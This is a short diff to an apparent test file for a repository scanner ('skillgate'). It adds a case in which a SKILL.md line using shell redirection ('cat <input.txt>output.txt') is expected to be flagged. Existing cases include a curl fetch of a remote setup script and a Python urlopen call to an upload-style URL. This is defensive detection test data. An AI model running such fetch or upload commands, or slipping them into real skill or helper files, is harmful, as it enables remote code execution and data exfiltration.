@@ -29,6 +29,7 @@ from skillgate.scan import scan_repository
             True,
         ),
         ("SKILL.md", "curl https://[HOST]/setup\n", True),
+        ("SKILL.md", "cat <input.txt>output.txt\n", True),
         (
             "helper.py",
             'NS = {"api": "https://upload.example.invalid/data"}\nurlopen(NS["api"])\n',
